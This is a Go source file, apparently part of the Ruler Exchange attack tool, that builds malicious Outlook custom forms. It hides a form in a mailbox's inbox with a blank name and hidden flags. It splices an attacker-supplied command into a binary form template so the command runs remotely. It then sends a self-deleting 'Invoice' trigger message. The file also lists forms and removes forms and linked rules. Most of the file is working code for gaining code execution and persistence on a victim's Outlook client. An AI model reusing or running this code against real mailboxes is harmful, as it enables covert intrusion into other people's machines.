package forms

import (
	"bufio"
	"bytes"
	"fmt"
	"os"
	"strings"

	"github.com/sensepost/ruler/mapi"
	"github.com/sensepost/ruler/utils"
)

// CreateFormAttachmentPointer creates the first attachment that holds info about the new form
func CreateFormAttachmentPointer(folderid, messageid []byte) error {
	utils.Info.Println("Create Form Pointer Attachment")
	data := []byte("FormStg=%d\\FS525C.tmp\nMsgCls=IPM.Note.grr\nBaseMsgCls=IPM.Note\n") //don't think this is strictly necessary
	data = append(data, []byte{0x00}...)
	attachmentPropertyTags := make([]mapi.TaggedPropertyValue, 4)
	attachmentPropertyTags[0] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagAttachMethod, PropertyValue: []byte{0x01, 0x00, 0x00, 0x00}}
	attachmentPropertyTags[1] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagRenderingPosition, PropertyValue: []byte{0xFF, 0xFF, 0xFF, 0xFF}}
	attachmentPropertyTags[2] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTag6900, PropertyValue: []byte{0x02, 0x00, 0x01, 0x00}} //prop value used by PidTagOfflineAddressBookTruncatedProps
	attachmentPropertyTags[3] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTag6902, PropertyValue: data}
	res, err := mapi.CreateMessageAttachment(folderid, messageid, attachmentPropertyTags)

	if err != nil {
		return err
	}
	//write the payload data to the attachment
	_, err = mapi.WriteAttachmentProperty(folderid, messageid, res.AttachmentID, mapi.PidTagAttachDataBinary, data)
	return err
}

// CreateFormAttachmentTemplate creates the template attachment holding the actual command to execute
func CreateFormAttachmentTemplate(folderid, messageid []byte, pstr string) error {
	return CreateFormAttachmentWithTemplate(folderid, messageid, pstr, "templates/formtemplate.bin")
}

// CreateFormAttachmentForDeleteTemplate creates the template attachment holding the actual command to execute
func CreateFormAttachmentForDeleteTemplate(folderid, messageid []byte, pstr string) error {
	return CreateFormAttachmentWithTemplate(folderid, messageid, pstr, "templates/formdeletetemplate.bin")
}

// CreateFormAttachmentWithTemplate creates a form with a specific template
func CreateFormAttachmentWithTemplate(folderid, messageid []byte, pstr, templatepath string) error {
	utils.Info.Println("Create Form Template Attachment")

	attachmentPropertyTags := make([]mapi.TaggedPropertyValue, 4)
	attachmentPropertyTags[0] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagAttachMethod, PropertyValue: []byte{0x01, 0x00, 0x00, 0x00}} //attach directly
	attachmentPropertyTags[1] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagRenderingPosition, PropertyValue: []byte{0xFF, 0xFF, 0xFF, 0xFF}}
	attachmentPropertyTags[2] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagAttachFilename, PropertyValue: utils.UniString("FS525C.tmp")} //a fake file name. this could probably be used as a mini signature ;)
	attachmentPropertyTags[3] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTag6900, PropertyValue: []byte{0x02, 0x00, 0x01, 0x00}}          //this is the prop that seems to be used in the PidTagOfflineAddressBookTruncatedProps
	res, _ := mapi.CreateMessageAttachment(folderid, messageid, attachmentPropertyTags)

	//read the template file for our payload
	datafull, err := utils.ReadFile(templatepath)
	if err != nil {
		utils.Error.Println(err)
		if os.IsNotExist(err) {
			utils.Error.Println("Couldn't find formtemplate.bin. Ensure that this is present at `PWD`/templates/formtemplate.bin")
		}
		return err
	}

	//find index of MAGIC - our marker where we place the payload
	index := -1
	for k := 0; k < len(datafull)-5; k++ {
		v := datafull[k : k+5]
		if bytes.Equal(v, []byte{0x4D, 0x41, 0x47, 0x49, 0x43}) {
			index = k
			break
		}
	}
	if index == -1 {
		return fmt.Errorf("Couldn't find MAGIC string in template. Ensure you have a valid template.")
	}
	//create our payload
	payload := utils.UniString(pstr)                       //convert to Unicode string
	payload = payload[:len(payload)-2]                     //get rid of null byte
	remainder := 4096 - len(pstr)                          //calculate the length of our padding.
	rpr := utils.UniString(strings.Repeat(" ", remainder)) //generate padding
	payload = append(payload, rpr[:len(rpr)-2]...)         //append padding (with null byte removed) to payload
	data := append([]byte{}, datafull[:index]...)          //create new array with our template up to the index. doing it this way to force new array creation
	data = append(data, payload...)                        // append our payload+padding
	data = append(data, datafull[index+5:]...)             //and append what is remaining of the template

	//write the template data into the attachment data field
	_, err = mapi.WriteAttachmentProperty(folderid, messageid, res.AttachmentID, mapi.PidTagAttachDataBinary, data)
	return err
}

// CreateFormMessage creates the associate message that holds the form data
func CreateFormMessage(suffix, assocRule string) ([]byte, error) {
	folderid := mapi.AuthSession.Folderids[mapi.INBOX]
	propertyTagx := make([]mapi.TaggedPropertyValue, 10)
	var err error

	propertyTagx[0] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagMessageClass, PropertyValue: utils.UniString("IPM.Microsoft.FolderDesign.FormsDescription")}
	propertyTagx[1] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagOfflineAddressBookName, PropertyValue: utils.UniString(fmt.Sprintf("IPM.Note.%s", suffix))}
	propertyTagx[2] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagOfflineAddressBookTruncatedProps, PropertyValue: []byte{0x03, 0x00, 0x00, 0x00, 0x02, 0x00, 0x01, 0x00, 0x03, 0x00, 0x01, 0x00, 0x05, 0x00, 0x01, 0x00}}
	propertyTagx[3] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagOfflineAddressBookLangID, PropertyValue: []byte{0x00, 0x00, 0x00, 0x00}}
	propertyTagx[4] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagOfflineAddressBookFileType, PropertyValue: []byte{0x00}}
	propertyTagx[5] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagDisplayName, PropertyValue: utils.UniString(" ")}     //Keep the name "invisible" - there will be an entry in the UI but it will be appear blank - since it's simply a space
	propertyTagx[6] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagSendOutlookRecallReport, PropertyValue: []byte{0xFF}} //set to true for form to be hidden :)
	propertyTagx[7] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTag6830, PropertyValue: append([]byte("&Open"), []byte{0x00}...)}
	propertyTagx[8] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagComment, PropertyValue: utils.UniString(assocRule)} //set this to indicate that a rule is present for this form
	propertyTagx[9] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagHidden, PropertyValue: []byte{0x01}}

	//create the message in the "associated" contents table for the inbox
	msg, err := mapi.CreateAssocMessage(folderid, propertyTagx)

	if err != nil {
		return nil, err
	}

	propertyTagx = make([]mapi.TaggedPropertyValue, 5)
	data := utils.EncodeNum(uint32(2))                               //COUNT as a uint32 instead of the usual uint16
	data = append(data, utils.EncodeNum(uint64(281487861678082))...) //static
	data = append(data, utils.EncodeNum(uint64(281496451612674))...) //static
	propertyTagx[0] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTag682C, PropertyValue: data}
	data = []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
	propertyTagx[1] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTag6831, PropertyValue: append(utils.COUNT(len(data)), data...)}
	data = []byte{0x0C, 0x0D, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46, 0x00, 0x6B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00}
	propertyTagx[2] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTag6832, PropertyValue: append(utils.COUNT(len(data)), data...)}
	propertyTagx[3] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTag6B00, PropertyValue: append([]byte("1112110010000000"), []byte{0x00}...)}

	data, err = utils.ReadFile("templates/img0.bin")
	if err != nil {
		utils.Error.Println(err)
		if os.IsNotExist(err) {
			utils.Error.Println("Couldn't find img0.bin. Ensure that this is present at `PWD`/templates/img0.bin")
		}
		return nil, err
	}
	//the small icon for the message
	propertyTagx[4] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTag6823, PropertyValue: append(utils.COUNT(len(data)), data...)}
	if _, err = mapi.SetMessageProperties(folderid, msg.MessageID, propertyTagx); err != nil {
		return nil, err
	}

	propertyTagx = make([]mapi.TaggedPropertyValue, 4)
	data, err = utils.ReadFile("templates/img1.bin")
	if err != nil {
		utils.Error.Println(err)
		if os.IsNotExist(err) {
			utils.Error.Println("Couldn't find img1.bin. Ensure that this is present at `PWD`/templates/img1.bin")
		}
		return nil, err
	}
	//the large icon for the message
	propertyTagx[0] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTag6824, PropertyValue: append(utils.COUNT(len(data)), data...)}
	propertyTagx[1] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTag6827, PropertyValue: append([]byte("en"), []byte{0x00}...)}                                                                               //Set language value
	propertyTagx[2] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagOABCompressedSize, PropertyValue: []byte{0x20, 0xF0, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}} //fixed value, not sure how this is calculated or if it can be kept static.
	propertyTagx[3] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagOABDN, PropertyValue: utils.CookieGen()}                                                                                                  //generate a random GUID

	_, err = mapi.SetMessageProperties(folderid, msg.MessageID, propertyTagx)

	return msg.MessageID, err
}

// CreateFormTriggerMessage creates a valid message to trigger RCE through an existing form
// requires a valid suffix to be supplied
func CreateFormTriggerMessage(suffix, subject, body string) ([]byte, error) {
	folderid := mapi.AuthSession.Folderids[mapi.INBOX]
	propertyTagx := make([]mapi.TaggedPropertyValue, 8)

	propertyTagx[0] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagMessageClass, PropertyValue: utils.UniString(fmt.Sprintf("IPM.Note.%s", suffix))}
	propertyTagx[1] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagConversationTopic, PropertyValue: utils.UniString("Invoice")}
	propertyTagx[2] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagIconIndex, PropertyValue: []byte{0x00, 0x00, 0x00, 0x01}}
	propertyTagx[3] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagMessageEditorFormat, PropertyValue: []byte{0x02, 0x00, 0x00, 0x00}}
	propertyTagx[4] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagNativeBody, PropertyValue: []byte{0x00, 0x00, 0x00, 0x03}}
	propertyTagx[5] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagSubject, PropertyValue: utils.UniString(subject)}
	propertyTagx[6] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagNormalizedSubject, PropertyValue: utils.UniString(subject)}
	propertyTagx[7] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagDeleteAfterSubmit, PropertyValue: []byte{0x01}}

	msg, er := mapi.CreateMessage(folderid, propertyTagx) //create the message
	if er != nil {
		return nil, er
	}

	bodyv := string(append([]byte{0x41, 0x41}, []byte(body)...))
	bodyProp := mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagBody, PropertyValue: utils.UniString(bodyv)}
	if _, er := mapi.SetPropertyFast(folderid, msg.MessageID, bodyProp); er != nil {
		return nil, er
	}
	return msg.MessageID, nil
}

// DeleteForm is used to delete a specific form stored in an associated table
func DeleteForm(suffix string, folderid []byte) ([]byte, error) {

	columns := make([]mapi.PropertyTag, 3)
	columns[0] = mapi.PidTagOfflineAddressBookName
	columns[1] = mapi.PidTagMid
	columns[2] = mapi.PidTagComment

	assoctable, err := mapi.GetAssociatedContents(folderid, columns)
	if err != nil {
		return nil, err
	}
	var foundMsgID []byte
	var hasRule string
	for k := 0; k < len(assoctable.RowData); k++ {
		if assoctable.RowData[k][0].Flag != 0x00 {
			continue
		}
		name := utils.FromUnicode(assoctable.RowData[k][0].ValueArray)
		messageid := assoctable.RowData[k][1].ValueArray
		if name != "" && name == fmt.Sprintf("IPM.Note.%s", suffix) {
			foundMsgID = messageid
			hasRule = utils.FromUnicode(assoctable.RowData[k][2].ValueArray)
			break
		}
	}
	if len(foundMsgID) == 0 {
		return nil, fmt.Errorf("No form with supplied suffix found!")
	}

	//delete the message
	if _, err = mapi.DeleteMessages(folderid, 1, foundMsgID); err != nil {
		return nil, err
	}

	utils.Info.Println("Form deleted successfully.")

	if hasRule != "NORULE" && hasRule != "" {
		utils.Question.Print("The form has an associated rule, delete this? [y/N]: ")
		reader := bufio.NewReader(os.Stdin)
		ans, _ := reader.ReadString('\n')
		if ans == "y\n" || ans == "Y\n" || ans == "yes\n" {
			rules, er := mapi.DisplayRules()
			if er != nil {
				return nil, er
			}
			for _, v := range rules {
				if utils.FromUnicode(v.RuleName) == hasRule {
					ruleid := v.RuleID
					err = mapi.ExecuteMailRuleDelete(ruleid)
					if err != nil {
						utils.Error.Println("Failed to delete rule")
						return nil, err
					}
					utils.Info.Println("Rule deleted successfully")
				}
			}
		} else {
			utils.Info.Printf("Rule not deleted. To delete rule, use rule name [%s]\n", hasRule)
		}
	}

	return nil, nil
}

// DisplayForms is used to display all forms  in the specified folder
func DisplayForms(folderid []byte) error {

	columns := make([]mapi.PropertyTag, 2)
	columns[0] = mapi.PidTagOfflineAddressBookName
	columns[1] = mapi.PidTagMid
	assoctable, err := mapi.GetAssociatedContents(folderid, columns)
	if err != nil {
		return err
	}
	var forms []string

	for k := 0; k < len(assoctable.RowData); k++ {
		if assoctable.RowData[k][0].Flag != 0x00 {
			continue
		}
		name := utils.FromUnicode(assoctable.RowData[k][0].ValueArray)
		if name != "" && len(name) > 3 {
			forms = append(forms, name)
		}
	}
	if len(forms) > 0 {
		utils.Info.Printf("Found %d forms\n", len(forms))
		for _, v := range forms {
			utils.Info.Println(v)
		}
	} else {
		utils.Info.Printf("No Forms Found\n")
	}

	return nil
}

// CheckForm verfies that a form does not already exist.
// having multiple forms with same suffix causes issues in outlook..
func CheckForm(folderid []byte, suffix string) error {
	columns := make([]mapi.PropertyTag, 2)
	columns[0] = mapi.PidTagOfflineAddressBookName
	columns[1] = mapi.PidTagMid

	assoctable, err := mapi.GetAssociatedContents(folderid, columns)
	if err != nil {
		return err
	}

	formname := fmt.Sprintf("IPM.Note.%s", suffix)

	for k := 0; k < len(assoctable.RowData); k++ {
		if assoctable.RowData[k][0].Flag != 0x00 {
			continue
		}
		//utils.Debug.Println(assoctable.RowData[k][0].ValueArray)
		name := utils.FromUnicode(assoctable.RowData[k][0].ValueArray)
		if name != "" && name == formname {
			return fmt.Errorf("Form with suffix [%s] already exists. You can not have multiple forms with the same suffix.", formname)
		}
	}
	return nil
}
